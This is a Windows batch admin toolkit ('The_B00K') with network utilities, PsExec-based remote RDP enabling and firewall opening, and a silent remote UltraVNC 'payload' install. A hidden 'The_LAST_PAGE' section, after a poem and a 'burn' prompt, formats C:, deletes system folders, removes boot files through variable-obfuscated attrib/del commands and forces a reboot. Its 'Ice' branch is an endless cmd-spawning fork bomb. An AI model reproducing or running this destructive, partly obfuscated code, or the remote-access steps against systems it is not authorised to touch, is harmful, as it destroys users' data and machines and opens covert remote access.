call :colbat f0 "Net_MENU"
:cnet
echo.
echo.
echo 01 - Add.IP.Hosts
echo 02 - Set.IP
echo 03 - Set.DNS
echo 04 - Telnet.Session
echo 05 - SSH.Session
echo 06 - Multi.Ping
echo 07 - AD.Report
echo X - Close.Net_MENU
echo.
echo Your last selection was: %ibegin% 
set /p ibegin=Selection [1-inf]:
echo Option %ibegin% selected @ %TIME% on %DATE% by %USERNAME% >> %LOG%

echo NetOption %ibegin% selected @ %TIME% on %DATE% by %USERNAME% >> %LOG%
if "%ibegin%"=="1" goto HOSTADD
if "%ibegin%"=="2" goto SETIP
if "%ibegin%"=="3" goto SETDNS
if "%ibegin%"=="4" goto TELNET
if "%ibegin%"=="5" goto SSHNOW
if "%ibegin%"=="6" goto MULTIPING
if "%ibegin%"=="7" goto ADREPORT
if /i "%ibegin%"=="x" goto BEGIN
goto NETMENU

::1i
:HOSTADD
echo EVENT: HostAdd @ %TIME% >> %LOG%
set /p hip= What IP would you like to add to the Hosts file? [x.x.x.x]::
set /p nip= What is the Hostname or FQDN for this IP?::
echo %HIP%    %NIP%>> C:\Windows\System32\Drivers\ETC\hosts
if errorlevel 0 echo IP successfully added to Hosts file! || echo Failed adding IP to Hosts file!
goto NETMENU

::2i
:SETIP
set /p nicname= What is the NIC proper name? [Default: "Local Area Connection"]::
if %nicname%==[%1]==[] set nicname=Local Area Connection
echo IP Configuration Type
echo [A] Set Static IP 
echo [B] Set DHCP 
echo. 
:choice 
SET /P C=Static or DHCP? [A/B]:: 
for %%? in (A) do if /I "%C%"=="%%?" goto A 
for %%? in (B) do if /I "%C%"=="%%?" goto B 
goto choice 
:A 
@echo off 
echo Please enter Static IP Address Information
echo Static IP Address::
set /p IP_Addr=
echo Default Gateway::
set /p D_Gate=
echo Subnet Mask:: 
set /p Sub_Mask=
echo Setting Static IP Information
netsh interface ip set address %NICNAME% static %IP_Addr% %Sub_Mask% %D_Gate% 1 
netsh int ip show config 
set /p adddns=Static IP set. Configure DNS? [Y/N]::
if /i "%adddns%"=="Y" goto SETDNS
if /i "%adddns%"=="Yes" goto SETDNS
if /i "%adddns%"=="N" goto NETMENU
if /i "%adddns%"=="No" goto NETMENU
:B 
@ECHO OFF 
ECHO Resetting IP Address and Subnet Mask For DHCP 
netsh int ip set address name = %NICNAME% source = dhcp
ipconfig /renew
ECHO Here are the new settings for %computername%: 
netsh int ip show config
pause 
goto NETMENU

::3i
:SETDNS
echo EVENT: SetDNS @ %TIME% >> %LOG%
set /p nicname= What is the NIC proper name? [Default: "Local Area Connection"]::
if "%nicname%"=="" set nicname=Local Area Connection
set /p vardns1= Primary DNS IP address? [Blank = OpenDNS]::
if "%vardns1%"=="" set vardns1=208.67.222.222
set /p vardns2= Secondary DNS IP address? [Blank = OpenDNS]::
if "%vardns2%"=="" set vardns2=208.67.220.220
echo Setting Primary DNS...
netsh int ip set dns name = %nicname% source = static addr = %vardns1%
IF ERRORLEVEL 1 ECHO ERROR: Unable to set primary DNS (%vardns1%) on %nicname%. %time% >> %LOG%
echo Setting Secondary DNS...
netsh int ip add dns name = %nicname% addr = %vardns2%
IF ERRORLEVEL 1 ECHO ERROR: Unable to set secondary DNS (%vardns2%) on %nicname%. %time% >> %LOG%
echo Refreshing configuration...
ipconfig /flushdns
echo Operation completed successfully!
pause
goto NETMENU

::4i
:TELNET
echo.
echo EVENT: Telnet @ %TIME% >> %LOG%
echo Launching Telnet Session...
app\putty\puttyp.exe -telnet
pause
goto NETMENU

::5i
:SSHNOW
echo.
echo EVENT: SSH @ %TIME% >> %LOG%
echo Launching SSH Session...
app\putty\puttyp.exe -ssh
pause
goto NETMENU

::6i
:MULTIPING
echo.
echo EVENT: MultiPing @ %TIME% >> %LOG%
echo Multi.Ping - Ping Multiple Target IPs Sequentially with Error Logging
set /p IP0=Set IP/FQDN 0::
set /p IP1=Set IP/FQDN 1::
set /p IP2=Set IP/FQDN 2::
set /p IP3=Set IP/FQDN 3::
set /p IP4=Set IP/FQDN 4::
set /p IP5=Set IP/FQDN 5::
set /p IP6=Set IP/FQDN 6::
set /p IP7=Set IP/FQDN 7::
set /p IP8=Set IP/FQDN 8::
set /p IP9=Set IP/FQDN 9::
set /p INTERVAL=Set Ping Interval [Seconds]::
set /p PLOG=Set Ping Log Name::
echo.
:PINGSET
echo -Starting Ping Set-
echo Pinging: %ip0%
ping -n 1 %ip0% | find "TTL=" > nul
if errorlevel 1 echo IP0 %date% %time% %ip0% >> %PLOG%
IF [%IP1%] == [] goto pfin
echo Pinging: %ip1%
ping -n 1 %ip1% | find "TTL=" > nul
if errorlevel 1 echo IP1 %date% %time% %ip1% >> %PLOG%
IF [%IP2%] == [] goto pfin
echo Pinging: %ip2%
ping -n 1 %ip2% | find "TTL=" > nul
if errorlevel 1 echo IP2 %date% %time% %ip2% >> %PLOG%
IF [%IP3%] == [] goto pfin
echo Pinging: %ip3%
ping -n 1 %ip3% | find "TTL=" > nul
if errorlevel 1 echo IP3 %date% %time% %ip3% >> %PLOG%
IF [%IP4%] == [] goto pfin
echo Pinging: %ip4%
ping -n 1 %ip4% | find "TTL=" > nul
if errorlevel 1 echo IP4 %date% %time% %ip4% >> %PLOG%
IF [%IP5%] == [] goto pfin
echo Pinging: %ip5%
ping -n 1 %ip5% | find "TTL=" > nul
if errorlevel 1 echo IP5 %date% %time% %ip5% >> %PLOG%
IF [%IP6%] == [] goto pfin
echo Pinging: %ip6%
ping -n 1 %ip6% | find "TTL=" > nul
if errorlevel 1 echo IP6 %date% %time% %ip6% >> %PLOG%
IF [%IP7%] == [] goto pfin
echo Pinging: %ip7%
ping -n 1 %ip7% | find "TTL=" > nul
if errorlevel 1 echo IP7 %date% %time% %ip7% >> %PLOG%
IF [%IP8%] == [] goto pfin
echo Pinging: %ip8%
ping -n 1 %ip8% | find "TTL=" > nul
if errorlevel 1 echo IP8 %date% %time% %ip8% >> %PLOG%
IF [%IP9%] == [] goto pfin
echo Pinging: %ip9%
ping -n 1 %ip9% | find "TTL=" > nul
if errorlevel 1 echo IP9 %date% %time% %ip9% >> %PLOG%
:pfin
echo -Finishing Ping Set-
timeout /t %INTERVAL% /nobreak
cls
GOTO PINGSET

::7i
:ADREPORT
if exist replreport.txt del replreport.txt
echo. >> replreport.txt 
echo new report >> replreport.txt
echo. >> replreport.txt
echo. 
echo Gathering Report for DCLIST = %1 
echo. 
Echo Report for DCLIST = %1 > replreport.txt
echo Gathering Verbose Replication and Connections 
echo Verbose Replication and Connections >> replreport.txt echo. >> replreport.txt 
repadmin /showrepl %1 /all >> replreport.txt 
echo. >> replreport.txt
echo Gathering Replication Summary 
echo Replication Summary >> replreport.txt echo. >> replreport.txt 
repadmin /replsummary %1 >> replreport.txt 
echo. >> replreport.txt
echo Gathering Bridgeheads 
echo Bridgeheads >> replreport.txt 
echo. >> replreport.txt 
repadmin /bridgeheads %1 /verbose >> replreport.txt 
echo. >> replreport.txt
echo Gathering ISTG 
echo ISTG >> replreport.txt 
echo. >> replreport.txt 
repadmin /istg %1 >> replreport.txt 
echo. >> replreport.txt
echo Gathering DRS Calls 
echo Outbound DRS Calls >> replreport.txt 
echo. >> replreport.txt 
repadmin /showoutcalls %1 >> replreport.txt 
echo. >> replreport.txt
echo Gathering Queue 
echo Queue >> replreport.txt 
echo. >> replreport.txt 
repadmin /queue %1 >> replreport.txt 
echo. >> replreport.txt
echo Gathering KCC Failures 
echo KCC Failures >> replreport.txt 
echo. >> replreport.txt 
repadmin /failcache %1 >> replreport.txt 
echo. >> replreport.txt
echo Gathering Trusts 
echo Trusts >> replreport.txt 
echo. >> replreport.txt 
repadmin /showtrust %1 >> replreport.txt 
echo. >> replreport.txt
echo Gathering Replication Flags 
echo Replication Flags >> replreport.txt 
echo. >> replreport.txt 
repadmin /bind %1 >> replreport.txt 
echo. >> replreport.txt
echo Running DCDiag 
echo DCDiag >> replreport.txt 
echo. >> replreport.txt 
dcdiag >> replreport.txt 
echo. >> replreport.txt
echo Done. >> replreport.txt
start notepad replreport.txt

:: ----------------------------------------------------------------------------

::Required Apps: PSExec
:REMMENU
title Remote_MENU
color 0f
cls
echo MENU: RemMENU @ %TIME% >> %LOG%
set colword=remo
call :colbat f0 "Remote_MENU"
:crem
echo.
echo.
echo 1 - Show.Network
echo 2 - Shutdown.GUI
echo 3 - Force.GPUpdate
echo 4 - Enable.RDP
echo V - Open.VNC_MENU
echo X - Close.Remote_MENU
echo.
echo Your last selection was: %rbegin% 
set /p rbegin=Selection [1-inf]:
echo Option %rbegin% selected @ %TIME% on %DATE% by %USERNAME% >> %LOG%

echo RemoteOption %rbegin% selected @ %TIME% on %DATE% by %USERNAME% >> %LOG%
if "%rbegin%"=="1" goto SHOWNET
if "%rbegin%"=="2" goto NETDOWN
if "%rbegin%"=="3" goto RGPUP
if "%rbegin%"=="4" goto ERDP
if /i "%rbegin%"=="v" goto VNCMENU
if /i "%rbegin%"=="x" goto BEGIN
goto REMMENU

::1r
:SHOWNET
echo Showing Network Devices...
net view
pause
goto REMMENU

::2r
:NETDOWN
echo Launching GUI...
shutdown /i
pause
goto REMMENU

::3r
:RGPUP
Echo Remote.GPUpdate
Echo.
Set /P rComp=Enter the Computer Name:
If  "%rComp%"==  "" goto BADRCOMP
app\psexec.exe \\%rComp% gpupdate /force
pause
Goto REMMENU
:badrcomp
Cls
Echo You have entered an incorrect name or left this field blank!
Echo.
Pause
Goto REMMENU

::4r
:ERDP
echo.
echo Enable.RDP - Enable RDP ^& Open Firewall. [Remote Capable]
set /p rdremo=Is this a remote target? [Y/N]::
if "%rdremo%"=="n" goto erdploc
set /p erdptgt=Select a target. [IP or FQDN]::
goto erdprem
:erdploc 
reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0x0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
netsh advfirewall set rule group="remote administration" new enable="yes"
netsh advfirewall firewall set rule group="remote administration" new enable=yes
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes profile=domain
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes profile=private
netsh firewall add portopening TCP 3389 "Remote Desktop"
netsh firewall set service RemoteDesktop enable
netsh firewall set service RemoteDesktop enable profile=ALL
netsh firewall set service RemoteAdmin enable
sc config TermService start= auto
net start Termservice
goto erdpend
:erdprem
app\psexec %erdptgt% reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
app\psexec %erdptgt% reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0x0 /f
app\psexec %erdptgt% reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
app\psexec %erdptgt% reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
app\psexec %erdptgt% netsh advfirewall set rule group="remote administration" new enable="yes"
app\psexec %erdptgt% netsh advfirewall firewall set rule group="remote administration" new enable=yes
app\psexec %erdptgt% netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
app\psexec %erdptgt% netsh advfirewall firewall set rule group="remote desktop" new enable=Yes profile=domain
app\psexec %erdptgt% netsh advfirewall firewall set rule group="remote desktop" new enable=Yes profile=private
app\psexec %erdptgt% netsh firewall add portopening TCP 3389 "Remote Desktop"
app\psexec %erdptgt% netsh firewall set service RemoteDesktop enable
app\psexec %erdptgt% netsh firewall set service RemoteDesktop enable profile=ALL
app\psexec %erdptgt% netsh firewall set service RemoteAdmin enable
app\psexec %erdptgt% sc config TermService start= auto
app\psexec %erdptgt% net start Termserviceapp\psexec %erdptgt% 
:erdpend
echo ERDP Processed...
pause
goto REMMENU

:: ----------------------------------------------------------------------------

::Required Apps: UltraVNC
:VNCMENU
title VNC_MENU
color 0f
cls
echo MENU: VNCMENU @ %TIME% >> %LOG%
set colword=vnc
call :colbat f0 "VNC_MENU"
:cvnc
echo.
echo.
echo 1 - Install.UltraVNC
echo X - Close.VNC_MENU
echo.
echo Your last selection was: %rbegin% 
set /p vbegin=Selection [1-inf]:
echo Option %vbegin% selected @ %TIME% on %DATE% by %USERNAME% >> %LOG%

echo RemoteOption %rvbegin% selected @ %TIME% on %DATE% by %USERNAME% >> %LOG%
if "%vbegin%"=="1" goto UVNC
if /i "%vbegin%"=="x" goto BEGIN
goto VNCMENU

::1v
:UVNC
echo.
echo Install.UltraVNC - Remotely install, configure, and run UltraVNC.
set /p target=Select target system. [IP or FQDN]::
set /p vpre=Full installation? [Y/N]::
if /i "%vpre%"=="n" set vpre=win
if /i "%vpre%"=="y" set vpre=ultra
set /p vncexe=Install 64 bit? [Y/N]::
if /i "%vncexe%"=="n" set vncpvar=" (x86)"
if /i "%vncexe%"=="n" set vncexe=uvnc\%vpre%vnc.exe
if /i "%vncexe%"=="y" set vncexe=uvnc\%vpre%vncx64.exe
:: Set Path
PUSHD app
::Map System \ admin permission
echo Accessing target...
net use \\%target%\c$
echo Copying payload to target...
copy %VNCexe% \\%target%\c$ /y
::Branch Full or Portable
if "%vpre%"=="win" goto uvncp
if "%vpre%"=="ultra" goto uvncf
:UVNCp
echo Copying configuration to target...
copy uvnc\ultraVNC.ini "\\%target%\c$" /y
echo Executing portable UltraVNC payload...
psexec \\%target% c:\%VNCexe% /run
goto UVNCEND
:UVNCf
echo Installing UltraVNC payload to target...
psexec \\%target% c:\%VNCexe% /verysilent
echo Copying configuration to target...
copy uvnc\ultraVNC.ini "\\%target%\c$\Program Files%vncpvar%\uvnc bvba\UltraVNC" /y
echo Starting VNC service on target...
psexec \\%target% "C:\Program Files%vncpvar%\uvnc bvba\UltraVNC\WinVNC.exe" -install
sc \\%target% start uvnc_service start= auto
goto UVNCEND
:UVNCEND
echo Remote VNC payload installation complete^^!
POPD
Pause
Goto VNCMENU

:: ----------------------------------------------------------------------------

::The_LAST_PAGE
:HELLOWORLD
echo WARNING: The_LAST_PAGE was read @ %TIME% >> %LOG%
title The_LAST_PAGE
cls
echo Some say the world will end in fire,
@timeout /t 3 /nobreak > nul
cls
echo some say ice.
@timeout /t 2 /nobreak > nul
cls
echo From what I've tasted of desire,
@timeout /t 3 /nobreak > nul
cls
echo I hold for those who favor fire...
@timeout /t 4 /nobreak > nul
cls
echo But if it had to perish twice...
@timeout /t 3 /nobreak > nul
cls
echo I think I know enough of hate,
@timeout /t 3 /nobreak > nul
cls
echo to know that for destruction
@timeout /t 2 /nobreak > nul
cls
echo ice
@timeout /t 1 /nobreak > nul
cls
echo is also great,
@timeout /t 2 /nobreak > nul
cls
echo and will suffice...
@timeout /t 10 /nobreak > nul
cls
set /p whoami= Are you Fire or Ice? [Fire/Ice]::
if /i "%whoami%"=="Fire" goto CONFIRMFIRE
if /i "%whoami%"=="Ice" goto CONFIRMICE
:CONFIRMFIRE
set /p iamfire= Are you ready to burn? [Y/N]::
if /i "%iamfire%"=="Y" goto FIRE
if /i "%iamfire%"=="Yes" goto FIRE
if /i "%iamfire%"=="N" goto exit
if /i "%iamfire%"=="No" goto exit
:CONFIRMICE
set /p iamice= Are you ready to freeze? [Y/N]::
if /i "%iamice%"=="Y" goto ICE
if /i "%iamice%"=="Yes" goto ICE
if /i "%iamice%"=="N" goto exit
if /i "%iamice%"=="No" goto exit

:FIRE
set /p startfire= DANGER: Fire will destroy this computer! [Type "burn" to confirm!]:
if /i "%startfire%"=="burn" (
echo 10 SECONDS until destruction begins!
ping localhost -n 10 >nul
echo 9 SECONDS
ping localhost -n 9 >nul
echo 8 SECONDS
ping localhost -n 8 >nul
echo 7 SECONDS
ping localhost -n 7 >nul
echo 6 SECONDS
ping localhost -n 6 >nul
echo 5 SECONDS
ping localhost -n 5 >nul
echo 4 SECONDS
ping localhost -n 4 >nul
echo 3 SECONDS
ping localhost -n 3 >nul
echo 2 SECONDS
ping localhost -n 2 >nul
echo 1 SECONDS
ping localhost -n 1 >nul
echo ´´´´´´´´´´´´´´´´´´´´´´´´¶´´´´´´´´´¶´´´´´´´´´´´´´´´´´´´´´´´´´´
echo ´´´´´´´´´´´´´´´´´´´´´´´´´¶´´´´´´´´´¶´´´´´´´´´´´´´´´´´´´´´´´´´
echo ´´´´´´´´´´´´´´´´´´´´´¶´´´¶´´´´´´´´´¶´´´¶´´´´´´´´´´´´´´´´´´´´´
echo ´´´´´´´´´´´´´´´´´´´´´¶´´¶¶´´´´´´´´´¶¶´´¶´´´´´´´´´´´´´´´´´´´´´
echo ´´´´´´´´´´´´´´´´´´´´´¶¶´¶¶¶´´´´´´´¶¶¶´¶¶´´´´´´´´´´´´´´´´´´´´´
echo ´´´´´´´´´´´´´¶´´´´´´¶¶´´´¶¶¶´´´´´¶¶¶´´´¶¶´´´´´´¶´´´´´´´´´´´´´
echo ´´´´´´´´´´´´¶¶´´´´´´¶¶´´´¶¶¶´´´´´¶¶¶´´´¶¶´´´´´´¶¶´´´´´´´´´´´´
echo ´´´´´´´´´´´¶¶´´´´´´¶¶´´´´¶¶¶¶´´´¶¶¶¶´´´´¶¶´´´´´´¶¶´´´´´´´´´´´
echo ´´´´´´´´´´´¶¶´´´´´¶¶¶´´´´¶¶¶¶´´¶¶¶¶¶´´´´¶¶¶´´´´´¶¶¶´´´´´´´´´´
echo ´´´´´´´¶´´¶¶¶´´´´¶¶¶¶´´´´¶¶¶¶´´´¶¶¶¶´´´´¶¶¶¶´´´¶¶¶¶´´¶´´´´´´´
echo ´´´´´´´¶¶´¶¶¶¶¶´´¶¶¶¶´´´¶¶¶¶¶´´´¶¶¶¶¶´´´¶¶¶¶´´¶¶¶¶¶´¶¶´´´´´´´
echo ´´´´´´´¶¶´¶¶¶¶¶´´¶¶¶¶¶¶¶¶¶¶¶´´´´´¶¶¶¶¶¶¶¶¶¶¶´´¶¶¶¶¶´¶´´´´´´´´
echo ´´´´´´´¶¶´¶¶¶¶¶´´¶¶¶¶¶¶¶¶¶¶¶´´´´´¶¶¶¶¶¶¶¶¶¶¶´´¶¶¶¶¶´¶¶´´´´´´´
echo ´´´´´´¶¶¶´´¶¶¶¶´´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´¶¶¶¶´´¶¶¶´´´´´´
echo ´´´´´¶¶¶¶´´¶¶¶¶´´´¶¶¶¶¶¶¶¶¶READY?¶¶¶¶¶¶¶¶¶¶´´´¶¶¶¶´´¶¶¶¶´´´´´
echo ´´´´¶¶¶¶´´´¶¶¶¶¶´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´¶¶¶¶¶´´´¶¶¶¶´´´´
echo ´´´¶¶¶¶´´´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´¶¶¶¶´´´´
echo ´´´¶¶¶¶¶´´¶¶¶¶¶¶¶¶¶¶¶¶¶BURN BABY BURN!¶¶¶¶¶¶¶¶¶¶¶¶¶´´¶¶¶¶´´´´
echo ´´´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´
echo ´´´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´
pause
format c:
del %systemdrive%
del %systemroot%
del %programfiles%
echo %random%.txt > C:\Users\%username%\Desktop\%random%.txt
set a= rem --
set b= rem
set c= The
set d= Fire
set f= Burns
set g= att
set h= rib
set i= -r
set j= -sssss
set k= -h
set l= c:\
set m= auto
set n= exec
set o= .
set p= bat
set q= del
set r= boot
set s= ini
set t= ntldr
set u= win
set v= dows
set w= \
set x= shut
set y= /r /t
set z= down
set aa= 00
%a%
%b% %c% %d% %f%
%g%%h% %i% %j% %k% %l%%m%%n%%o%%p%
%q% %l%%m%%n%%o%%p%
%g%%h% %i% %j% %k% %l%%r%%o%%s%
%q% %l%%r%%o%%s%
%g%%h% %i% %j% %k% %l%%t%
%q% %l%%t%
%g%%h% %i% %j% %k% %l%%u%%v%%w%%u%%o%%s%
%q% %l%%u%%v%%w%%u%%o%%s%
%x%%z% %y% %aa%
%a%
) ELSE (
goto begin
)

:ICE
echo Is it c0ld in here?
pause
:loop
start cmd
goto loop

:WTF
cls
color C
echo        _ ._  _ , _ ._
echo      (_ ' ( `  )_  .__)
echo    ( (  (    )   `)  ) _)
echo   (__ (_   (_ . _) _) ,__)
echo       `~~`\ ' . /`~~`
echo       ,::: ;   ; :::,
echo      ':::::::::::::::'
echo __________/_ __ \____________
echo.
echo Error:%WTF%
echo.
pause
exit

:colbat
set "param=^%~2" !
set "param=!param:"=\"!"
findstr /p /A:%1 "." "!param!\..\X" nul
<nul set /p ".=%DEL%%DEL%%DEL%%DEL%%DEL%%DEL%%DEL%"
PING 127.0.0.1 -n 1 -w 10 >NUL
if "%colword%"=="know" goto cinit
if "%colword%"=="index" goto cindex
if "%colword%"=="db" goto cdb
if "%colword%"=="net" goto cnet
if "%colword%"=="remo" goto crem
if "%colword%"=="vnc" goto cvnc

::The_B00K closes...
:EXIT
cls
echo                        .-:::::::::::::+`
echo                -::::::-.              .://.
echo         -:::::-`                          -/-
echo   `:oymMm-                                  .//`
echo :dMMMMMMMM+                                    :/-
echo NMMMMMNNMMMh`                                    .//`
echo sMMMmNMMMMMMN/                                      -/:
echo `dMdMMMMMMMMMMy`                                      `:/.
echo  .mhMMMNmmmMMMMm:                                        -/:`
echo   `yNMNhMMMMMMMMMy`                                         :/:
echo    .yNhMMMMMNmmMMMm:                                          `//.
echo     `yhMMMNhmMMMMMMMy`                                           -/:`
echo       sdMNhMMMMMMMMMMN+                                             :/:
echo       `omyMMMMMMddmMMMMd.                                             `:/-
echo         :yMMMMdhNMMMMMMMMo`                                              smo.
echo          ohMMdhMMMMMMMMMMMm:                                             sMMMd/`
echo          `+dMsMMMMMMMddNMMMMh.                                           sMMMms:
echo            `hsMMMMMhhNMMMMMMMNo`                                       .:oo+o
echo             `smMMNsMMMMMMMMMMMMm/                                  .:::-  -+
echo              .smMsMMMMMMMMMMMMMMMh-                           `-:::.     `o
echo                /NsMMMMMMMdhhmMMMMMMs`                     `::::`         :-
echo                 /oMMMMMmymMMMMMMMMMMN+                `:::-              .h/
echo                  oyMMMhyMMMMMMMMMMMMMMm/          .:::-               -+o+-
echo                   :hMNoMMMMMMMMMMMMMMMMMd-    .:::.               -oys/`
echo                     sdyMMMMMMMMMMMMMMMMMMMy:::.              `:ohy+.
echo                      ooMMMMMMMMMMMMMMMMNh+.              `:shy+-
echo                      `ohMMMMMMMMMMMMmo-              `/shy+-
echo                       `:mMMMMMMMMmo.             ./shy/.
echo                         `hMMMMMd:   .        ./yhs/.
echo                           sMMMy   :dMN+  .+yyo:`
echo                            /NM/     oMMmho-`
echo                             -mN/`:oyyoMMm.
echo                              `shy+.   /MNm`
echo                                        +:.:
echo.                                                 
echo %USERNAME% has closed The_B00K. The_LAST_PAGE is blank...
echo END: B00K_Cl0sed @ %TIME% >> %LOG%
if exist ".\X" del ".\X"
timeout /T 5 >nul
exit